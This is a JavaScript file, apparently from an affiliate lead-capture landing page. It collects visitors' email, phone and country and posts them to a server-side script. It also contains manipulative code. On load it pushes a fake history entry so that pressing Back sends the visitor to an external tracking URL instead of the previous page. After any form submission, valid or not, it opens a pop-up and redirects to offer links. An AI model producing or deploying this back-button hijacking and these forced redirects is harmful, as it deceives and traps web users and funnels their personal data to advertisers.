
function getAllUrlParams() {

    var queryString = window.location.search.slice(1);
    var obj = {};
    if (queryString) {
        queryString = queryString.split('#')[0];
        var arr = queryString.split('&');
    
        for (var i=0; i<arr.length; i++) {
            var a = arr[i].split('=');
            var paramNum = undefined;
            var paramName = a[0].replace(/\[\d*\]/, function(v) {
                paramNum = v.slice(1,-1);
                return '';
            });
            var paramValue = typeof(a[1])==='undefined' ? true : a[1];
            paramName = paramName.toLowerCase();
            paramValue = paramValue.toLowerCase();
            if (obj[paramName]) {
                if (typeof obj[paramName] === 'string') {
                    obj[paramName] = [obj[paramName]];
                }
                if (typeof paramNum === 'undefined') {
                    obj[paramName].push(paramValue);
                }
                else {
                    obj[paramName][paramNum] = paramValue;
                }
            }
            else {
                obj[paramName] = paramValue;
            }
        }
    }
    return obj;
}

var domain = 'borgach.com';
var t1 = 'empty';

if(getAllUrlParams().domain !== undefined){
    domain = getAllUrlParams().domain;
}
if(getAllUrlParams().t1 !== undefined){
    t1 = getAllUrlParams().t1;
}

// Native  
// var native = 'https://broaming.com/click.php?key=fjtmtsyrohchf25ozcfk&t1={t1}_nbb&campaign={campaign}&trafficsource_name={trafficsource_name}&lander={lander}&t5={pid}&t6={offer_id}/{offer_name}';
//var native = 'https://broaming.com/click.php?key=fjtmtsyrohchf25ozcfk&t1=' + t1 + '_nbb&campaign={campaign}&trafficsource_name={trafficsource_name}&lander={lander}&t5={pid}&t6={offer_id}/{offer_name}';
var native = 'http://xi1sg.mjt.lu/nl2/xi1sg/xmhr.html';
console.info(native);

$(function(){
    var count_click = 0;

    function newLand(){
      var msg="New Lend";
      var customUrl ="";
      window.history.pushState({"html":msg,"pageTitle":"My Title"},"", customUrl);
      count_click++;
    }

     // window.onload = function() {
       newLand();
     // };

    window.onpopstate = function(event) {
      if(count_click >= 0){
        window.location.replace(native);
        window.location.href = native;
      }
    }

});


// var additionalOffer = 'https://broaming.com/click.php?key=sta4ttbhahsgadxn7vdc&t1={t1}_add&campaign={campaign}&trafficsource_name={trafficsource_name}&lander={lander}&t5={pid}&t6={offer_id}/{offer_name}';
//var additionalOffer = 'https://broaming.com/click.php?key=sta4ttbhahsgadxn7vdc&t1=' + t1 + '_add&campaign={campaign}&trafficsource_name={trafficsource_name}&lander={lander}&t5={pid}&t6={offer_id}/{offer_name}';
var additionalOffer = 'http://xi1sg.mjt.lu/nl2/xi1sg/xmhr.html';
console.info(additionalOffer);

var redirect = 'http://xi1sg.mjt.lu/nl2/xi1sg/xmhr.html';
console.info(redirect);

function goRedirect() {
    PreventExitPop = false;
    window.open(redirect);
    location.href = additionalOffer;
}

// var back = 'https://broaming.com/click.php?key=yynzawz7po1digj863p0&t1={t1}_bb&campaign={campaign}&trafficsource_name={trafficsource_name}&lander={lander}&t5={pid}&t6={offer_id}/{offer_name}';
//var back = 'https://broaming.com/click.php?key=yynzawz7po1digj863p0&t1=' + t1 + '_bb&campaign={campaign}&trafficsource_name={trafficsource_name}&lander={lander}&t5={pid}&t6={offer_id}/{offer_name}';
var back = 'http://xi1sg.mjt.lu/nl2/xi1sg/xmhr.html';
console.info(back);

function goBack() {
    PreventExitPop = false;
    location.href = back;
}




//Send data
$(function(){
    $('#country').val(geoplugin_countryCode());

    var form = $("#form");
    $(form).validate({
        rules: {
          email: {
            email: true
          },
            phone: {
              required: true
            }
        },
        onkeyup: false,
        errorPlacement: function(error,element) {
            return true;
        },
        submitHandler: function(form) {
            console.log("Input validated. Sending data to server...")

            let srcName = $('#src').val();
            let srcId = $('#src_id').val();
            let country = $('#country').val();
            let email = $('#email').val();
            let phone = $('#phone').val();


            console.log( email, country, phone, srcName, srcId);

            $.ajax({
                type: 'post',
                //async: false,
                url: 'sendCURL.php',
                //dataType: 'json',
                data: {email: email, country: country,  phoneNumber: phone, source : srcName, source_id : srcId},
                cache: false,
                success: function (data) {
                    console.log('success');   
                },
                // функция ошибки ответа сервера
                error: function( jqXHR, status, errorThrown ){
                    //console.log(status+jqXHR);
                    console.log('error');

                }
            });
            console.log('goForward');
            goRedirect();

        },
        invalidHandler: function(event, validator) {
            console.log("Email not filled correctly. Data not sent. Redirecting forward");
            goRedirect();

        }

    });


});